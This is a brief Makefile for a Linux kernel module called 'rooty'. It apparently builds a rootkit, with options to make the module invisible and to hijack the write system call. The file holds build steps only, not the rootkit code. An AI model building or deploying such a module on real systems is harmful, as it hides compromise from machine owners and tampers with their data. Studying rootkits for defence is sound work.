obj-m := rooty.o
KERNEL_DIR = /lib/modules/$(shell uname -r)/build
PWD = $(shell pwd)
OPTS =

all:
	KCPPFLAGS=$(KCPPFLAGS) $(MAKE) -C $(KERNEL_DIR) SUBDIRS=$(PWD) $(OPTS) 

invisible: KCPPFLAGS = "-DINVISIBLE_MODULE"
invisible: all

write: KCPPFLAGS = "-DHIJACK_WRITE"
write: all

invisible_write: KCPPFLAGS = -DINVISIBLE_MODULE -DHIJACK_WRITE

clean:
	-rm -rf *.o *.ko *.symvers *.mod *.order

